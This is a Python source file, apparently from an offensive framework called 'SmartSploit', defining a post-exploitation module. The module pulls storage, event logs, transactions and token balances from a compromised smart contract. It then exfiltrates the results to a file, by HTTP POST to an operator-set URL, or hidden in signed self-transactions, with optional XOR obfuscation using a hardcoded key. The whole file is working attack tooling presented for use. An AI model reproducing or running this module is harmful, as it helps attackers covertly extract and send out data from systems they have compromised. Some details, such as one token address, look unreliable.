"""
Data Exfiltration Post-Exploitation Module
SmartSploit Framework - Extract sensitive data from compromised contracts
"""

from smartsploit.lib.base_module import BasePost, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import json
import requests
import base64
import time
import logging

logger = logging.getLogger(__name__)

class DataExfiltrationPost(BasePost):
    """Post-exploitation module for extracting sensitive data from compromised contracts"""
    
    def __init__(self):
        super().__init__()
        self.name = "Data Exfiltration"
        self.description = "Extracts sensitive data from compromised smart contracts"
        self.author = "SmartSploit Team"
        
        # Set module info
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "Smart Contract Storage Analysis",
                "Blockchain Data Extraction Techniques",
                "Privacy-Preserving Contract Analysis"
            ],
            severity="high",
            targets=["Compromised contracts", "Storage slots", "Event logs", "Transaction data"]
        )
        
        # Module options
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Compromised contract address"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "PRIVATE_KEY": {"value": "", "required": False, "description": "Account private key if needed"},
            "EXTRACTION_TYPE": {"value": "storage", "required": True, "description": "Type (storage, events, transactions, balances)"},
            "STORAGE_SLOTS": {"value": "0-10", "required": False, "description": "Storage slots to extract (e.g., 0-10 or 1,5,9)"},
            "BLOCK_RANGE": {"value": "100", "required": False, "description": "Number of recent blocks to analyze"},
            "EXFIL_METHOD": {"value": "file", "required": True, "description": "Exfiltration method (file, http, ipfs, steganography)"},
            "OUTPUT_FORMAT": {"value": "json", "required": False, "description": "Output format (json, csv, xml)"},
            "EXFIL_URL": {"value": "", "required": False, "description": "HTTP endpoint for data exfiltration"},
            "ENCRYPT_DATA": {"value": "true", "required": False, "description": "Encrypt extracted data"},
            "STEALTH_MODE": {"value": "false", "required": False, "description": "Use steganographic exfiltration"}
        }
        
    def check_requirements(self) -> bool:
        """Check if all requirements are met"""
        target = self.options["TARGET_CONTRACT"]["value"]
        if not target:
            logger.error("Target contract address is required")
            return False
            
        if not Web3.is_address(target):
            logger.error("Invalid contract address format")
            return False
            
        return True
        
    def extract_storage_data(self, w3, contract_address: str) -> dict:
        """Extract storage data from contract"""
        try:
            logger.info("Extracting contract storage data...")
            
            storage_data = {
                "contract": contract_address,
                "storage_slots": {},
                "total_slots_checked": 0,
                "non_zero_slots": 0
            }
            
            # Parse storage slots option
            slots_option = self.options["STORAGE_SLOTS"]["value"]
            if "-" in slots_option:
                start, end = map(int, slots_option.split("-"))
                slots_to_check = list(range(start, end + 1))
            else:
                slots_to_check = [int(x.strip()) for x in slots_option.split(",") if x.strip()]
                
            logger.info(f"Checking storage slots: {slots_to_check}")
            
            for slot in slots_to_check:
                try:
                    # Get storage at slot
                    storage_value = w3.eth.get_storage_at(contract_address, slot)
                    storage_data["total_slots_checked"] += 1
                    
                    if storage_value != b'\x00' * 32:  # Non-zero value
                        storage_data["non_zero_slots"] += 1
                        storage_data["storage_slots"][slot] = {
                            "raw_value": storage_value.hex(),
                            "decoded_uint": int.from_bytes(storage_value, byteorder='big'),
                            "decoded_string": self._try_decode_string(storage_value),
                            "decoded_address": self._try_decode_address(storage_value)
                        }
                        
                        logger.info(f"Found data in slot {slot}: {storage_value.hex()[:20]}...")
                        
                except Exception as e:
                    logger.warning(f"Error reading storage slot {slot}: {e}")
                    
            return storage_data
            
        except Exception as e:
            logger.error(f"Storage extraction failed: {e}")
            return {"error": str(e)}
            
    def extract_event_logs(self, w3, contract_address: str) -> dict:
        """Extract event logs from contract"""
        try:
            logger.info("Extracting contract event logs...")
            
            current_block = w3.eth.block_number
            block_range = int(self.options["BLOCK_RANGE"]["value"])
            from_block = max(0, current_block - block_range)
            
            event_data = {
                "contract": contract_address,
                "from_block": from_block,
                "to_block": current_block,
                "events": [],
                "total_events": 0
            }
            
            # Get all logs for the contract
            logs = w3.eth.get_logs({
                'address': contract_address,
                'fromBlock': from_block,
                'toBlock': current_block
            })
            
            logger.info(f"Found {len(logs)} events in blocks {from_block}-{current_block}")
            
            for log in logs:
                event_info = {
                    "block_number": log.blockNumber,
                    "transaction_hash": log.transactionHash.hex(),
                    "log_index": log.logIndex,
                    "topics": [topic.hex() for topic in log.topics],
                    "data": log.data.hex(),
                    "decoded_data": self._try_decode_event_data(log)
                }
                
                event_data["events"].append(event_info)
                event_data["total_events"] += 1
                
            return event_data
            
        except Exception as e:
            logger.error(f"Event log extraction failed: {e}")
            return {"error": str(e)}
            
    def extract_transaction_data(self, w3, contract_address: str) -> dict:
        """Extract transaction data involving the contract"""
        try:
            logger.info("Extracting transaction data...")
            
            current_block = w3.eth.block_number
            block_range = int(self.options["BLOCK_RANGE"]["value"])
            from_block = max(0, current_block - block_range)
            
            transaction_data = {
                "contract": contract_address,
                "from_block": from_block,
                "to_block": current_block,
                "transactions": [],
                "total_transactions": 0,
                "total_value": 0
            }
            
            logger.info(f"Scanning blocks {from_block}-{current_block} for transactions...")
            
            for block_num in range(from_block, current_block + 1):
                try:
                    block = w3.eth.get_block(block_num, full_transactions=True)
                    
                    for tx in block.transactions:
                        # Check if transaction involves our contract
                        if tx.to == contract_address or tx['from'] == contract_address:
                            tx_info = {
                                "hash": tx.hash.hex(),
                                "block_number": block_num,
                                "from": tx['from'],
                                "to": tx.to,
                                "value": str(tx.value),
                                "value_eth": Web3.from_wei(tx.value, 'ether'),
                                "gas": tx.gas,
                                "gas_price": tx.gasPrice,
                                "input_data": tx.input.hex(),
                                "function_selector": tx.input[:4].hex() if len(tx.input) >= 4 else None
                            }
                            
                            # Get transaction receipt for more details
                            try:
                                receipt = w3.eth.get_transaction_receipt(tx.hash)
                                tx_info["gas_used"] = receipt.gasUsed
                                tx_info["status"] = receipt.status
                            except:
                                pass
                                
                            transaction_data["transactions"].append(tx_info)
                            transaction_data["total_transactions"] += 1
                            transaction_data["total_value"] += float(tx_info["value_eth"])
                            
                except Exception as e:
                    logger.warning(f"Error scanning block {block_num}: {e}")
                    continue
                    
            return transaction_data
            
        except Exception as e:
            logger.error(f"Transaction extraction failed: {e}")
            return {"error": str(e)}
            
    def extract_balance_data(self, w3, contract_address: str) -> dict:
        """Extract balance and token information"""
        try:
            logger.info("Extracting balance and token data...")
            
            balance_data = {
                "contract": contract_address,
                "eth_balance": 0,
                "token_balances": [],
                "total_value_eth": 0
            }
            
            # Get ETH balance
            eth_balance = w3.eth.get_balance(contract_address)
            balance_data["eth_balance"] = Web3.from_wei(eth_balance, 'ether')
            balance_data["total_value_eth"] = float(balance_data["eth_balance"])
            
            # Common ERC20 token addresses (mainnet)
            common_tokens = {
                "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                "USDC": "0xA0b86a33E6417D5b31F0591cBE1C32C8b9D8C8B6",
                "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
                "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
                "UNI": "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"
            }
            
            # Check token balances (simplified)
            for token_name, token_address in common_tokens.items():
                try:
                    # ERC20 balanceOf function signature: 0x70a08231
                    balance_call_data = "0x70a08231" + contract_address[2:].zfill(64)
                    
                    result = w3.eth.call({
                        'to': token_address,
                        'data': balance_call_data
                    })
                    
                    if result and result != b'\x00' * 32:
                        balance = int.from_bytes(result, byteorder='big')
                        if balance > 0:
                            balance_data["token_balances"].append({
                                "token_name": token_name,
                                "token_address": token_address,
                                "balance_wei": str(balance),
                                "balance_decimal": balance / (10**18)  # Assuming 18 decimals
                            })
                            
                except Exception as e:
                    logger.debug(f"Error checking {token_name} balance: {e}")
                    
            return balance_data
            
        except Exception as e:
            logger.error(f"Balance extraction failed: {e}")
            return {"error": str(e)}
            
    def _try_decode_string(self, storage_value: bytes) -> str:
        """Try to decode storage value as string"""
        try:
            # Remove null bytes and try to decode as UTF-8
            cleaned = storage_value.rstrip(b'\x00')
            if cleaned:
                return cleaned.decode('utf-8', errors='ignore')
        except:
            pass
        return None
        
    def _try_decode_address(self, storage_value: bytes) -> str:
        """Try to decode storage value as Ethereum address"""
        try:
            # Addresses are stored in the last 20 bytes
            if len(storage_value) >= 20:
                address_bytes = storage_value[-20:]
                if any(b != 0 for b in address_bytes):  # Not all zeros
                    return Web3.to_checksum_address(address_bytes)
        except:
            pass
        return None
        
    def _try_decode_event_data(self, log) -> dict:
        """Try to decode event log data"""
        try:
            decoded = {
                "topics_decoded": [],
                "data_chunks": []
            }
            
            # Try to decode topics as addresses or common types
            for topic in log.topics:
                topic_hex = topic.hex()
                
                # Check if it's an address (last 20 bytes)
                if len(topic_hex) == 66:  # 0x + 64 chars
                    try:
                        address = Web3.to_checksum_address("0x" + topic_hex[-40:])
                        decoded["topics_decoded"].append(f"address:{address}")
                    except:
                        decoded["topics_decoded"].append(f"bytes32:{topic_hex}")
                else:
                    decoded["topics_decoded"].append(f"bytes:{topic_hex}")
                    
            # Split data into 32-byte chunks
            data_hex = log.data.hex()
            if data_hex:
                for i in range(0, len(data_hex), 64):
                    chunk = data_hex[i:i+64]
                    if chunk:
                        # Try to decode as uint256
                        try:
                            value = int(chunk, 16)
                            decoded["data_chunks"].append(f"uint256:{value}")
                        except:
                            decoded["data_chunks"].append(f"bytes32:0x{chunk}")
                            
            return decoded
            
        except Exception as e:
            return {"decode_error": str(e)}
            
    def encrypt_data(self, data: dict) -> str:
        """Encrypt extracted data"""
        try:
            if self.options["ENCRYPT_DATA"]["value"].lower() != "true":
                return json.dumps(data, indent=2)
                
            # Simple XOR encryption for demo (use proper crypto in production)
            import hashlib
            
            json_data = json.dumps(data)
            key = hashlib.sha256(b"smartsploit_key").digest()
            
            encrypted = bytearray()
            for i, byte in enumerate(json_data.encode()):
                encrypted.append(byte ^ key[i % len(key)])
                
            return base64.b64encode(encrypted).decode()
            
        except Exception as e:
            logger.error(f"Data encryption failed: {e}")
            return json.dumps(data, indent=2)
            
    def exfiltrate_data(self, data: dict) -> dict:
        """Exfiltrate extracted data using specified method"""
        try:
            exfil_method = self.options["EXFIL_METHOD"]["value"]
            
            # Prepare data for exfiltration
            if self.options["OUTPUT_FORMAT"]["value"] == "csv":
                formatted_data = self._convert_to_csv(data)
            elif self.options["OUTPUT_FORMAT"]["value"] == "xml":
                formatted_data = self._convert_to_xml(data)
            else:
                formatted_data = self.encrypt_data(data)
                
            result = {
                "method": exfil_method,
                "success": False,
                "size_bytes": len(formatted_data),
                "timestamp": time.time()
            }
            
            if exfil_method == "file":
                # Save to file
                filename = f"exfiltrated_data_{int(time.time())}.{self.options['OUTPUT_FORMAT']['value']}"
                with open(filename, 'w') as f:
                    f.write(formatted_data)
                result["success"] = True
                result["filename"] = filename
                
            elif exfil_method == "http":
                # Send via HTTP
                exfil_url = self.options["EXFIL_URL"]["value"]
                if exfil_url:
                    response = requests.post(exfil_url, data=formatted_data, timeout=30)
                    result["success"] = response.status_code == 200
                    result["http_status"] = response.status_code
                else:
                    result["error"] = "No exfiltration URL provided"
                    
            elif exfil_method == "ipfs":
                # IPFS upload (simplified)
                result["success"] = False
                result["error"] = "IPFS exfiltration not implemented in demo"
                
            elif exfil_method == "steganography":
                # Steganographic exfiltration
                result.update(self._steganographic_exfiltration(formatted_data))
                
            return result
            
        except Exception as e:
            logger.error(f"Data exfiltration failed: {e}")
            return {"success": False, "error": str(e)}
            
    def _convert_to_csv(self, data: dict) -> str:
        """Convert data to CSV format"""
        try:
            import io
            output = io.StringIO()
            
            # Simple CSV conversion for demo
            output.write("Type,Key,Value\n")
            
            def flatten_dict(d, prefix=""):
                for key, value in d.items():
                    if isinstance(value, dict):
                        flatten_dict(value, f"{prefix}{key}.")
                    elif isinstance(value, list):
                        for i, item in enumerate(value):
                            if isinstance(item, dict):
                                flatten_dict(item, f"{prefix}{key}[{i}].")
                            else:
                                output.write(f"list,{prefix}{key}[{i}],{item}\n")
                    else:
                        output.write(f"value,{prefix}{key},{value}\n")
                        
            flatten_dict(data)
            return output.getvalue()
            
        except Exception as e:
            logger.error(f"CSV conversion failed: {e}")
            return str(data)
            
    def _convert_to_xml(self, data: dict) -> str:
        """Convert data to XML format"""
        try:
            def dict_to_xml(d, root_name="data"):
                xml = f"<{root_name}>\n"
                for key, value in d.items():
                    if isinstance(value, dict):
                        xml += dict_to_xml(value, key)
                    elif isinstance(value, list):
                        xml += f"<{key}>\n"
                        for item in value:
                            if isinstance(item, dict):
                                xml += dict_to_xml(item, "item")
                            else:
                                xml += f"<item>{item}</item>\n"
                        xml += f"</{key}>\n"
                    else:
                        xml += f"<{key}>{value}</{key}>\n"
                xml += f"</{root_name}>\n"
                return xml
                
            return dict_to_xml(data, "exfiltrated_data")
            
        except Exception as e:
            logger.error(f"XML conversion failed: {e}")
            return str(data)
            
    def _steganographic_exfiltration(self, data: str) -> dict:
        """Perform steganographic data exfiltration"""
        try:
            # Create steganographic blockchain transactions
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            
            if not self.options["PRIVATE_KEY"]["value"]:
                return {"success": False, "error": "Private key required for steganographic exfiltration"}
                
            account = w3.eth.account.from_key(self.options["PRIVATE_KEY"]["value"])
            
            # Split data into chunks that fit in transaction data
            chunk_size = 1000  # bytes
            chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
            
            transactions = []
            
            for i, chunk in enumerate(chunks):
                # Create transaction with data hidden in input field
                txn = {
                    'to': account.address,  # Send to self
                    'value': 0,
                    'gas': 21000 + len(chunk.encode()) * 16,  # Gas for data
                    'gasPrice': w3.eth.gas_price,
                    'nonce': w3.eth.get_transaction_count(account.address) + i,
                    'data': '0x' + chunk.encode().hex()
                }
                
                signed_txn = w3.eth.account.sign_transaction(txn, self.options["PRIVATE_KEY"]["value"])
                
                # In a real scenario, these would be sent with delays
                transactions.append({
                    "chunk_id": i,
                    "signed_transaction": signed_txn.rawTransaction.hex(),
                    "data_size": len(chunk)
                })
                
            return {
                "success": True,
                "method": "blockchain_steganography",
                "total_chunks": len(chunks),
                "transactions": transactions
            }
            
        except Exception as e:
            logger.error(f"Steganographic exfiltration failed: {e}")
            return {"success": False, "error": str(e)}
            
    def run(self) -> dict:
        """Main execution method"""
        if not self.check_requirements():
            return {"result": "error", "message": "Requirements check failed"}
            
        logger.info("Starting data exfiltration...")
        
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            contract_address = self.options["TARGET_CONTRACT"]["value"]
            extraction_type = self.options["EXTRACTION_TYPE"]["value"]
            
            result = {
                "result": "success",
                "target_contract": contract_address,
                "extraction_type": extraction_type,
                "extracted_data": {},
                "exfiltration_result": {}
            }
            
            # Perform extraction based on type
            if extraction_type == "storage":
                result["extracted_data"] = self.extract_storage_data(w3, contract_address)
            elif extraction_type == "events":
                result["extracted_data"] = self.extract_event_logs(w3, contract_address)
            elif extraction_type == "transactions":
                result["extracted_data"] = self.extract_transaction_data(w3, contract_address)
            elif extraction_type == "balances":
                result["extracted_data"] = self.extract_balance_data(w3, contract_address)
            elif extraction_type == "all":
                logger.info("Performing comprehensive data extraction...")
                result["extracted_data"] = {
                    "storage": self.extract_storage_data(w3, contract_address),
                    "events": self.extract_event_logs(w3, contract_address),
                    "transactions": self.extract_transaction_data(w3, contract_address),
                    "balances": self.extract_balance_data(w3, contract_address)
                }
            else:
                return {"result": "error", "message": f"Unknown extraction type: {extraction_type}"}
                
            # Check for extraction errors
            if "error" in result["extracted_data"]:
                return {"result": "error", "message": f"Data extraction failed: {result['extracted_data']['error']}"}
                
            # Exfiltrate the data
            logger.info("Exfiltrating extracted data...")
            result["exfiltration_result"] = self.exfiltrate_data(result["extracted_data"])
            
            if result["exfiltration_result"].get("success"):
                logger.info("Data exfiltration completed successfully")
                result["message"] = "Data extraction and exfiltration completed successfully"
            else:
                logger.warning("Data extraction successful but exfiltration failed")
                result["message"] = "Data extracted but exfiltration failed"
                
            return result
            
        except Exception as e:
            logger.error(f"Data exfiltration post-exploitation failed: {e}")
            return {"result": "error", "message": str(e)}